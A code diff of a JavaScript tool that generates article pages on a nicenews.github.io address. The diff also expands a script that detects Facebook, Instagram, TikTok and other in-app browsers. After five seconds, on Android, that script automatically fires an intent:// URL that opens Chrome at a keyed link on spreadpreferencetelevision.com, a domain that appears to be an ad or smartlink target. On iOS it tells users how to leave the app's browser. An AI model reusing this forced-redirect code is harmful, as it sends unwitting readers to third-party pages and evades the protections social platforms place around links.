@@ -102,9 +102,8 @@
 
 <script>
 let baseDomain = "https://nicenews.github.io/"; 
-let currentRandomCode = ""; // Dikosongkan di awal
+let currentRandomCode = ""; 
 
-// Fungsi membuat kode random (angka & huruf kecil)
 function generateRandomCode(length) {
     const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
     let result = '';
@@ -131,7 +130,6 @@ fetch('domain.txt')
         console.log('File domain.txt tidak ditemukan.');
     });
 
-// Fungsi untuk memperbarui tampilan URL di layar
 function updatePreviewUrl() {
     if (currentRandomCode) {
         const fullUrl = baseDomain + currentRandomCode;
@@ -139,7 +137,6 @@ function updatePreviewUrl() {
         recLink.href = fullUrl;
         recLink.textContent = fullUrl;
         
-        // Animasi highlight hijau sebentar agar user sadar link sudah berubah
         const recBox = document.getElementById('rec-box');
         recBox.style.backgroundColor = '#d4edda';
         recBox.style.borderLeftColor = '#28a745';
@@ -165,13 +162,9 @@ function generateAndDownload() {
         return;
     }
 
-    // 1. GENERATE KODE ACAK TEPAT SAAT TOMBOL DIKLIK
     currentRandomCode = generateRandomCode(12);
-    
-    // 2. MUNCULKAN LINK REVIEWNYA KE LAYAR
     updatePreviewUrl();
 
-    // 3. PROSES PEMBUATAN FILE
     const h1Title = lines[0]; 
     const remainingParagraphs = lines.slice(1);
     
@@ -235,19 +228,40 @@ function generateAndDownload() {
     <div id="inapp-overlay">
         <h2>Action Required</h2>
         <p>For the best reading experience and to view the full media, please continue in your browser.</p>
-        <a href="https://spreadpreferencetelevision.com/hhqe0ruxga?key=1c6fc543f8d5a17312a84c3611e52f80" class="btn-redirect">Continue to Browser</a>
+        <a href="https://spreadpreferencetelevision.com/hhqe0ruxga?key=1c6fc543f8d5a17312a84c3611e52f80" id="redirect-btn" class="btn-redirect">Continue to Browser</a>
+        
+        <!-- Pesan bantuan khusus untuk Apple/iOS -->
+        <div id="ios-instruction" style="display:none; margin-top:25px; font-size:1.1rem; color:#e0e0e0; background: #222; padding: 15px; border-radius: 8px;">
+            <p style="margin-bottom:8px; color: #ffcc00; font-weight: bold;">If you are using an iPhone/iPad:</p>
+            <p>Tap the <strong>three dots (...)</strong> menu icon at the corner and select <strong>"Open in Browser / Safari"</strong>.</p>
+        </div>
     </div>
 
-    <!-- Script Internal Delay 5 Detik Overlay FB -->
+    <!-- Script Internal Delay 5 Detik & Auto Redirect Chrome -->
     <script>
         document.addEventListener("DOMContentLoaded", function() {
             const ua = navigator.userAgent || navigator.vendor || window.opera;
             const isInAppBrowser = /FBAN|FBAV|Instagram|TikTok|Line|Twitter|Threads/i.test(ua);
+            const isAndroid = /android/i.test(ua);
+            const isIOS = /iPad|iPhone|iPod/.test(ua) && !window.MSStream;
+
             if (isInAppBrowser) {
                 setTimeout(() => {
                     const overlay = document.getElementById('inapp-overlay');
+                    const btn = document.getElementById('redirect-btn');
+                    
+                    const rawTarget = "spreadpreferencetelevision.com/hhqe0ruxga?key=1c6fc543f8d5a17312a84c3611e52f80";
+                    
                     overlay.style.display = 'flex';
                     document.body.style.overflow = 'hidden'; 
+
+                    if (isAndroid) {
+                        const intentUrl = "intent://" + rawTarget + "#Intent;scheme=https;package=com.android.chrome;end";
+                        btn.href = intentUrl;
+                        window.location.href = intentUrl; 
+                    } else if (isIOS) {
+                        document.getElementById('ios-instruction').style.display = 'block';
+                    }
                 }, 5000); 
             }
         });
